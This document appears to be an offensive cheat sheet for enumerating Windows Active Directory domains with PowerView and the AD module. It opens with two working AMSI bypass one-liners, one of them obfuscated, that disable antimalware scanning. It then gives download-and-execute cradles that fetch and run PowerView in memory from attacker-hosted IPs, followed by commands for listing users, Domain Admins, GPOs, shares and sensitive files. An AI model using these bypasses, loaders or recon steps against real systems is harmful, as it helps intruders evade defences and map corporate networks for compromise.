# Enumeration with PowerView (AMSI block it so we need to bypass it!)

### Here is how to search for a bypass: https://www.google.com/search?q=amsi+bypass+2024

```powershell
sET-ItEM ( 'V'+'aR' + 'IA' + 'bLE:1q2' + 'uZx' ) ( [TYpe]( "{1}{0}" -F'F','re' ) ) ; ( GeT-VariABle ( "1Q2U" + "zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(
(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','Management','Automation','s','System' ) )."g`etF`iELD"(
( "{0}{2}{1}" -f'amsi','d','InitFaile' ),
( "{2}{4}{0}{1}{3}" -f 'Static','c','NonPubli','c','' )
))."sE`T`VaLUE"( ${n ULl},${t`rUe} )
```

```powershell
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Failed") {$f=$e}};$f.SetValue($null,$true)
```

### Install the PowerView script from kali

```powershell
iex (new-Object Net.WebClient).DownloadString('http://10.10.10.1:8000/PowerView.ps1')

IEX([Net.Webclient]::new().DownloadString("http://192.168.115.1:8000/powerview.ps1"))
```

### Get Command

```powershell
Get-NetDomain
Get-NetForest
Get-DomainSID
Get-DomainPolicy
(Get-DomainPolicy)."System Access"
(Get-DomainPolicy -Domain lab.local)."Kerberos Policy"

Get-NetDomainController
Get-NetDomainController -Domain lab.local

Get-NetUser # gets all users details on the domain!
Get-NetUser | select -ExpandProperty samaccountname # get all users names
Get-UserProperty
Get-UserProperty -Properties memberof

Get-NetComputer
Get-NetComputer -Ping # Computer that are on!
Get-NetComputer -FullData # Get everything about the computers
Get-NetComputer -OperatingSystem "*server*" # Get every server computer!

Get-NetGroup
Get-NetGroup -FullData
Get-NetGroup *admin*
Get-NetGroupMember -GroupName "Domain Admins" -Recurse
Get-NetGroup -UserName "xle0x"
Get-NetLocalGroup -ComputerName SQL-PROD-01.lab.local -ListGroups # Enumerate the groups of which this computer joined in!! but the problem it's blocked to see other computers! you have to be a local admin!

Get-NetGPO # gets group policy objects for all objects
Get-NetGPO -ComputerName DC-01.lab.local
Get-NetGPO | select displayname # gets you names of the policies
GetNetGPOGroup

Find-GPOComputerAdmin -ComputerName DC-01.lab.local
Find-GPOLocation -UserName xle0x -Verbose

Get-NetOU
Get-NetOU -FullData

Get-NetGPO -GPOName "{objectguid_here}"
```

# Enumeration with AD Module

### Installing AD Module
https://github.com/samratashok/ADModule/blob/master/Import-ActiveDirectory.ps1

Install it on kali and download it with WebClient, Once Downloaded Import it:

```powershell
Import-ActiveDirectory
```

### Get Domain

```powershell
Get-ADDomain
Get-ADForest
(Get-ADDomain).DomainSID

Get-ADDefaultDomainPasswordPolicy

Get-ADDomainController
Get-ADDomainController -DomainName lab.local -Discover

Get-ADUser -Filter * -Properties * # get all users details!
Get-ADUser -Filter * -Properties * | select -First 1 # Get the first user from the Get-ADUser output!

Get-ADComputer -Filter * | select Name # Get all computer names
Get-ADComputer -Filter 'OperatingSystem' -like "*10*"' -Properties OperatingSystem

Get-ADGroup -Filter * -Properties *
Get-ADGroup -Filter * | Select Name
Get-ADGroupMember -Identity "Domain Admins" -Recursive # shows you users of a group domain admins!

Get-ADPrincipalGroupMembership -Identity xle0x # shows you which groups xle0x is in!

Get-ADOrganizationalUnit -Filter * -Properties *
```


# Enumerating SMB With PowerView

### Invoke-ShareFinder (shows you shares!)
```powershell
Invoke-ShareFinder -Verbose
```

### Invoke-FileFinder (shows you sensitive files on shares!)

```poweshell
Invoke-FileFinder
```

### Get-NetFileServer

```powershell
Get-NetFileServer
```
